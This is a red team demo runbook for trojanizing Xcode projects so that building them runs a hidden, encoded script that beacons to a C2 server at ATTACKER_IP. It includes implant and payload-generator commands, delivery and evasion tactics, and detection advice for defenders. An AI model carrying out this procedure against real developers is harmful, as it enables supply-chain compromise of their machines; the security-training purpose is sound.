# RED TEAM DEMO RUNBOOK

## Supply Chain Attack via Xcode Build Scripts

**Classification:** Educational / Red Team Exercise  
**Attack Type:** Supply Chain / Developer Targeting  
**Target Platform:** macOS  
**MITRE ATT&CK:** T1195.002 (Supply Chain Compromise: Compromise Software Supply Chain)

---

## Executive Summary

This demo simulates a supply chain attack targeting macOS developers through a trojanized Xcode project. When a victim opens and builds the project, a hidden build script executes, establishing a C2 beacon.

**Attack Chain:**
```
Attacker creates trojanized Xcode project
        ↓
Victim downloads project (GitHub, direct link, etc.)
        ↓
Victim opens project in Xcode
        ↓
Victim builds project (Cmd+B)
        ↓
Hidden build script executes
        ↓
Payload beacons to C2 server
        ↓
C2 returns additional payloads (AppleScript)
        ↓
Persistence established
```

---

## Prerequisites

### Hardware/Software
- macOS system (attacker machine)
- macOS system (victim machine - can be same for demo)
- Xcode installed on victim machine
- Python 3.8+
- Network connectivity between attacker and victim

### Demo Setup
```bash
cd red_team_demo/scripts
./setup.sh
```

---

## Demo Procedure

### Phase 1: Setup C2 Infrastructure (2 minutes)

**Terminal 1 - Attacker Machine:**

```bash
# Navigate to demo directory
cd red_team_demo

# Activate virtual environment
source .venv/bin/activate

# Start C2 server
python3 c2_server/c2_server.py --host 0.0.0.0 --port 8888
```

**Expected Output:**
```
╔══════════════════════════════════════════════════════════════╗
║                    RED TEAM C2 SERVER                        ║
║              Supply Chain Attack Demonstration               ║
╚══════════════════════════════════════════════════════════════╝

[2026-03-07 10:30:00] INFO: Starting C2 server on 0.0.0.0:8888
[2026-03-07 10:30:00] INFO: Admin dashboard: http://0.0.0.0:8888/admin
```

**Verification:**
- Open browser to `http://localhost:8888/admin`
- Verify dashboard loads with 0 beacons

---

### Phase 2: Weaponize Xcode Project (3 minutes)

**Terminal 2 - Attacker Machine:**

```bash
# Activate virtual environment
source .venv/bin/activate

# Option A: Implant the demo project
python3 xcode_implant/implant_xcode_project.py \
    --project demo_project/*.xcodeproj \
    --c2 http://ATTACKER_IP:8888 \
    --beacon-id xcode_demo

# Option B: Implant any Xcode project
python3 xcode_implant/implant_xcode_project.py \
    --project /path/to/AnyProject.xcodeproj \
    --c2 http://ATTACKER_IP:8888
```

**Expected Output:**
```
╔══════════════════════════════════════════════════════════════╗
║              RED TEAM - Xcode Project Implanter              ║
╚══════════════════════════════════════════════════════════════╝

[*] Target project: /path/to/Project.xcodeproj
[+] Backup created: project.pbxproj.backup
[+] Payload script created: .../xcuserdata/.xcassets/xcassets.sh
[+] Build phase injected into: project.pbxproj
[+] Script sandboxing disabled for payload execution

═══════════════════════════════════════════════════════════════
[+] IMPLANT SUCCESSFUL!
═══════════════════════════════════════════════════════════════
```

**What Changed:**
1. Created hidden script at: `Project.xcodeproj/xcuserdata/.xcassets/xcassets.sh`
2. Added `PBXShellScriptBuildPhase` to `project.pbxproj`
3. Set `ENABLE_USER_SCRIPT_SANDBOXING = NO` in Debug config

---

### Phase 3: Deliver to Victim (Simulated)

In a real scenario, delivery could be via:
- Compromised GitHub repository
- Malicious pull request
- Fake tutorial website
- Social engineering (email with "helpful" project)

**For demo purposes:**
```bash
# Copy to shared location or victim machine
cp -r demo_project /path/to/shared/
# Or zip and "share"
zip -r MaliciousProject.zip demo_project/
```

---

### Phase 4: Victim Execution (2 minutes)

**Victim Machine:**

1. Open the Xcode project
```bash
open /path/to/Project.xcodeproj
```

2. Build the project: **Cmd+B**

**What Happens:**
1. Xcode runs build phases
2. Hidden `xcassets.sh` script executes
3. Script decodes and runs payload
4. Payload sends beacon to C2
5. C2 returns AppleScript payload
6. AppleScript executes (shows demo dialog)
7. Activity logged to `/tmp/redteam_demo/`

---

### Phase 5: Observe C2 Activity (Demo Highlight)

**Attacker - C2 Dashboard:**

1. Refresh `http://ATTACKER_IP:8888/admin`
2. Observe new beacon entry:
   - Timestamp
   - Beacon ID: `xcode_demo`
   - Username: victim's username
   - Platform: macos
   - Source IP

**Victim Machine - Visible Artifacts:**

```bash
# Check demo log
cat /tmp/redteam_demo/build.log

# Expected output:
# [DEMO] ========================================
# [DEMO] Xcode Build Script Triggered
# [DEMO] Time: Sat Mar  7 10:35:00 PST 2026
# [DEMO] User: victimuser
# [DEMO] Project: /path/to/Project
# [DEMO] ========================================
```

---

### Phase 6: Demonstrate Persistence (Optional)

```bash
# Show persistence techniques (educational only)
python3 payloads/payload_generator.py --type persistence --c2 http://localhost:8888
```

This displays common macOS persistence mechanisms without actually installing them.

---

### Phase 7: Cleanup

**Remove implant from project:**
```bash
python3 xcode_implant/implant_xcode_project.py \
    --project /path/to/Project.xcodeproj \
    --cleanup
```

**Remove demo artifacts:**
```bash
rm -rf /tmp/redteam_demo
rm -f /tmp/.demo_response.txt
```

**Stop C2 server:** Ctrl+C

---

## Talking Points for Demo

### For Red Team Audience

1. **Why this works:**
   - Developers trust code from repos
   - Xcode build scripts run with user privileges
   - Hidden in xcuserdata (often gitignored)
   - `ENABLE_USER_SCRIPT_SANDBOXING = NO` bypasses protections

2. **Evasion techniques demonstrated:**
   - Triple hex encoding
   - Hidden directory naming (`.xcassets`)
   - Legitimate-looking script names
   - Silent failure handling

3. **Real-world applicability:**
   - Target: open source maintainers
   - Target: developers reviewing PRs
   - Target: anyone downloading "tutorials"

### For Blue Team Audience

1. **Detection opportunities:**
   - Monitor for shell scripts in `.xcuserdata`
   - Alert on `ENABLE_USER_SCRIPT_SANDBOXING = NO`
   - Network monitoring for unusual POST requests during builds
   - Process tree: Xcode → bash → curl

2. **Prevention:**
   - Code review build phases before running
   - Enable "Warn when building with user scripts" in Xcode
   - Use hardened runtime
   - Network segmentation for dev environments

---

## Quick Reference Commands

```bash
# Start C2
python3 c2_server/c2_server.py --port 8888

# Implant project
python3 xcode_implant/implant_xcode_project.py -p /path/to.xcodeproj -c http://C2:8888

# Generate payloads
python3 payloads/payload_generator.py --type shell --c2 http://C2:8888
python3 payloads/payload_generator.py --type xcode --c2 http://C2:8888

# Test beacon manually
curl -X POST http://localhost:8888/s/test -d 'p=macos&u=testuser&a=12345'

# Check C2 API
curl http://localhost:8888/api/stats
curl http://localhost:8888/api/beacons

# Cleanup
python3 xcode_implant/implant_xcode_project.py -p /path/to.xcodeproj --cleanup
rm -rf /tmp/redteam_demo
```

---

## Troubleshooting

| Issue | Solution |
|-------|----------|
| C2 server won't start | Check port not in use: `lsof -i :8888` |
| No beacon received | Check firewall, verify C2 URL in payload |
| Xcode doesn't run script | Ensure Debug config, check build phases |
| Permission denied | Run `chmod +x` on scripts |
| Flask not found | Activate venv: `source .venv/bin/activate` |

---

## Safety Notes

- All payloads in this demo are **NON-DESTRUCTIVE**
- Payloads show visible notifications (unlike real malware)
- Activity is logged to `/tmp/redteam_demo/` for visibility
- Project backup is created before modification
- Cleanup scripts provided

**DO NOT** use these techniques outside of authorized testing environments.
